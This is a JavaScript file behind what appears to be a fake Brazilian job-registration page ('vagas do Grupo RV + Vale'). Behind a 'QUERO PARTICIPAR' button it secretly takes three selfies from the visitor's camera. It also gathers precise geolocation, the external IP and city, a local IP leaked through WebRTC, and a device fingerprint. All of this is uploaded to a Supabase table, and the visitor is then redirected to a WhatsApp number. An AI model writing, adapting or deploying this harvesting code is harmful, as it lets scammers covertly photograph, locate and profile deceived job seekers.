// ================================================
// CONFIGURAÇÃO SUPABASE
// ================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// ================================================
// FUNÇÃO DE FALA
// ================================================
function falar(texto) {
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 0.95;
  fala.rate = 0.97;
  speechSynthesis.speak(fala);
}

// ================================================
// CAPTURA AVANÇADA DE INFORMAÇÕES (Melhor Fingerprint)
// ================================================
async function getAdvancedInfo() {
  const info = {};

  // WebRTC - Tentativa de pegar IP local e portas
  try {
    const rtc = new RTCPeerConnection({ iceServers: [] });
    rtc.createDataChannel("");
    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));

    rtc.onicecandidate = (event) => {
      if (event.candidate) {
        const candidate = event.candidate.candidate;
        const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        if (ipMatch) info.localIP = ipMatch[1];
        
        const portMatch = candidate.match(/(\d{1,5})\s+typ/);
        if (portMatch) info.localPort = portMatch[1];
      }
    };
  } catch (e) {}

  // Outras informações úteis
  info.userAgent = navigator.userAgent;
  info.platform = navigator.platform;
  info.language = navigator.language;
  info.languages = navigator.languages?.join(", ");
  info.screenWidth = screen.width;
  info.screenHeight = screen.height;
  info.innerWidth = window.innerWidth;
  info.innerHeight = window.innerHeight;
  info.deviceMemory = navigator.deviceMemory || "N/A";
  info.hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  return info;
}

// ================================================
// INICIALIZAÇÃO
// ================================================
async function iniciarSistema() {
  try {
    statusText.innerHTML = "🟡 Iniciando sistema...";
    falar("Preparando seu cadastro...");

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    statusText.innerHTML = "✅ Sistema pronto. Clique em QUERO PARTICIPAR";
  } catch (err) {
    statusText.innerHTML = "❌ Erro ao acessar câmera.";
  }
}

// ================================================
// EVENTO PRINCIPAL
// ================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
    statusText.innerHTML = "📸 Capturando fotos...";

    // Captura das fotos
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for (let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      fotos.push(canvas.toDataURL("image/jpeg", 0.45));
      if (i < 2) await new Promise(r => setTimeout(r, 800));
    }

    // Desliga câmera
    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());

    // Geolocalização
    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
      });
      latitude = pos.coords.latitude;
      longitude = pos.coords.longitude;
    } catch (e) {}

    // IP Externo
    let ip = "indisponível";
    let cidade = "", estado = "", pais = "";
    try {
      statusText.innerHTML = "🌐 Obtendo dados de rede...";
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      ip = data.ip || "indisponível";
      cidade = data.city || "";
      estado = data.region || "";
      pais = data.country_name || "";
    } catch (e) {}

    const advanced = await getAdvancedInfo();

    statusText.innerHTML = "💾 Salvando no banco...";

    const { error } = await supabaseClient.from('checkins').insert([{
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      user_agent: advanced.userAgent,
      modelo_dispositivo: advanced.platform,
      versao_android: /Android\s([0-9.]+)/.exec(advanced.userAgent)?.[1] || null,
      navegador: advanced.userAgent.includes("Chrome") ? "Chrome" : "Outro",
      plataforma: advanced.platform,
      idioma: advanced.language,
      largura_tela: advanced.innerWidth,
      altura_tela: advanced.innerHeight,
      local_ip: advanced.localIP || null,
      local_port: advanced.localPort || null,
      screen_width: advanced.screenWidth,
      screen_height: advanced.screenHeight,
      timezone: advanced.timezone,
      hardware: advanced.hardwareConcurrency
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído com sucesso!";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2500);

  } catch (err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro ao salvar. Tente novamente.";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});

window.onload = iniciarSistema;
